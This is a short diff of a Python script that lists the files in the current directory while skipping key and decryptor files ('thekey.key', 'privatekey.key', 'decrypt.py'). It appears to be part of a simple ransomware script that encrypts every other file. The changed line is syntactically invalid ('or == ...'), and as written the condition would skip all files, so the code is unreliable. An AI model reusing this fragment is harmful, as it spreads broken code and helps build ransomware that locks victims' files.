@@ -7,7 +7,7 @@ files = []
 
 # loop through the files in the current directory
 for file in os.listdir():
-    if file == "thekey.key":
+    if file == "thekey.key" or == "privatekey.key" or "decrypt.py":
         continue 
     if os.path.isfile(file):
         files.append(file)
